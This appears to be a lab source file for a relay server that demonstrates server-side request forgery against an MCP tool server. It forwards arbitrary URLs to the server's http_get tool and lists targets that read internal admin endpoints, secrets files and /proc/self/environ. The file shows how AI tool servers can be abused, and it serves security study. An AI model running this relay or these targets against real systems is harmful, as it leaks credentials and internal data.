"""
SSRF Relay Service

A simple public relay server that accepts a URL parameter and asks the MCP to fetch it.
The service itself contains no secrets — it is just a basic "fetch whatever URL you give me" interface.

Why the MCP is vulnerable:
The MCP has access to internal-only resources (e.g., localhost admin ports, container metadata, 
internal service endpoints, file URLs). If the MCP fetches any attacker-controlled URL that 
the relay server forwards, the attacker can trick the MCP into requesting its own internal 
URLs and leaking sensitive data. The weakness is that the MCP fetches arbitrary URLs without 
restricting domains.

Port: 8001
"""

import asyncio
import sys
from pathlib import Path
from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse
import uvicorn
from datetime import datetime
import json

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

app = FastAPI(title="SSRF Relay Service", description="Public relay for SSRF attacks")

# Track requests for logging/demonstration
request_log = []

# Global MCP client (initialized on startup)
mcp_client = None
mcp_client_lock = asyncio.Lock()


@app.middleware("http")
async def log_requests(request: Request, call_next):
    """Log all requests for attack demonstration"""
    timestamp = datetime.now().isoformat()
    log_entry = {
        "timestamp": timestamp,
        "method": request.method,
        "path": str(request.url.path),
        "client": request.client.host if request.client else "unknown"
    }
    request_log.append(log_entry)
    print(f"[SSRF Relay] {timestamp} - {request.method} {request.url.path} from {log_entry['client']}")
    
    response = await call_next(request)
    return response


@app.get("/")
async def root():
    """
    Root endpoint - explain the service
    
    This service contains NO secrets. It's just a relay.
    """
    return {
        "service": "SSRF Relay Service",
        "description": "Public relay that forwards URL fetch requests to MCP server",
        "note": "This service contains NO secrets. The vulnerability is in the MCP server's ability to fetch internal URLs.",
        "endpoint": "/fetch?url=<URL_TO_FETCH>",
        "examples": {
            "scenario_1": "/fetch?url=http://127.0.0.1:8080/admin/config (secrets in separate service)",
            "scenario_2": "/fetch?url=file:///cis_project/mcp_security_project/server/mcp_secrets.json (secrets in MCP server)"
        },
        "scenarios": {
            "scenario_1": {
                "name": "Secrets in other internal services",
                "description": "Secrets stored in separate service (port 8080)",
                "targets": [
                    "http://127.0.0.1:8080/admin/config",
                    "http://127.0.0.1:8080/internal/keys",
                    "http://127.0.0.1:8080/metadata/instance"
                ]
            },
            "scenario_2": {
                "name": "Secrets in MCP server itself",
                "description": "Secrets stored in MCP server's config files",
                "targets": [
                    "file:///cis_project/mcp_security_project/server/mcp_secrets.json",
                    "file://./server/mcp_secrets.json",
                    "file:///proc/self/environ"
                ]
            }
        },
        "warning": "This relay service has NO secrets. Secrets are in either: (1) separate internal services, or (2) the MCP server itself."
    }


async def get_mcp_client():
    """Get or create MCP client connection"""
    global mcp_client
    
    async with mcp_client_lock:
        if mcp_client is None:
            print("[SSRF Relay] Initializing MCP client connection...")
            try:
                server_params = StdioServerParameters(
                    command="python",
                    args=["-m", "server.vulnerable_server"],
                    env=None,
                    cwd=str(project_root)
                )
                
                stdio_context = stdio_client(server_params)
                stdio_transport = await stdio_context.__aenter__()
                read, write = stdio_transport
                
                session_context = ClientSession(read, write)
                session = await session_context.__aenter__()
                await session.initialize()
                
                mcp_client = {
                    "session": session,
                    "session_context": session_context,
                    "stdio_context": stdio_context,
                    "stdio_transport": stdio_transport
                }
                print("[SSRF Relay] ✓ MCP client connected")
            except Exception as e:
                print(f"[SSRF Relay] ERROR: Failed to connect to MCP server: {e}")
                raise
    
    return mcp_client


@app.get("/fetch")
async def fetch_url(url: str = Query(..., description="URL to fetch via MCP")):
    """
    Relay endpoint that asks MCP to fetch a URL
    
    This service has NO secrets - it just forwards the URL to MCP.
    The attack works because MCP can access internal URLs that attackers cannot.
    """
    print(f"[SSRF Relay] Received request to fetch: {url}")
    
    try:
        # Get MCP client connection
        client = await get_mcp_client()
        session = client["session"]
        
        # Call MCP's http_get tool
        print(f"[SSRF Relay] Calling MCP http_get tool with URL: {url}")
        result = await session.call_tool("http_get", {"url": url})
        
        # Parse result
        if result.content:
            content_text = result.content[0].text if result.content else ""
            try:
                mcp_result = json.loads(content_text)
                print(f"[SSRF Relay] ✓ MCP fetch successful")
                return {
                    "status": "success",
                    "relay_service": "SSRF Relay (no secrets)",
                    "mcp_result": mcp_result,
                    "note": "This relay service contains no secrets. The MCP server fetched the URL."
                }
            except json.JSONDecodeError:
                return {
                    "status": "success",
                    "relay_service": "SSRF Relay (no secrets)",
                    "mcp_result": {"raw": content_text},
                    "note": "This relay service contains no secrets. The MCP server fetched the URL."
                }
        else:
            return {
                "status": "error",
                "message": "MCP returned no content",
                "requested_url": url
            }
            
    except Exception as e:
        print(f"[SSRF Relay] ERROR: {e}")
        return {
            "status": "error",
            "message": str(e),
            "requested_url": url,
            "note": "Failed to fetch URL via MCP server"
        }


@app.get("/logs")
async def get_logs():
    """Request logs endpoint - for demonstration only"""
    return {
        "status": "success",
        "total_requests": len(request_log),
        "logs": request_log[-50:]  # Last 50 requests
    }


@app.on_event("shutdown")
async def shutdown_event():
    """Clean up MCP client on shutdown"""
    global mcp_client
    if mcp_client:
        try:
            await mcp_client["session_context"].__aexit__(None, None, None)
            await mcp_client["stdio_context"].__aexit__(None, None, None)
            print("[SSRF Relay] MCP client disconnected")
        except Exception as e:
            print(f"[SSRF Relay] Error during shutdown: {e}")


if __name__ == "__main__":
    print("\n" + "="*70)
    print("  SSRF Relay Service - Public Relay Server")
    print("="*70)
    print("  Port: 8001")
    print("  Purpose: Relay URL fetch requests to MCP server")
    print("  Endpoint: GET /fetch?url=<URL>")
    print("  ⚠️  This service contains NO secrets")
    print("  ⚠️  Secrets must be in MCP's environment (localhost services, etc.)")
    print("="*70 + "\n")
    
    # Run on 0.0.0.0 to be publicly accessible (for demonstration)
    uvicorn.run(app, host="0.0.0.0", port=8001, log_level="info")
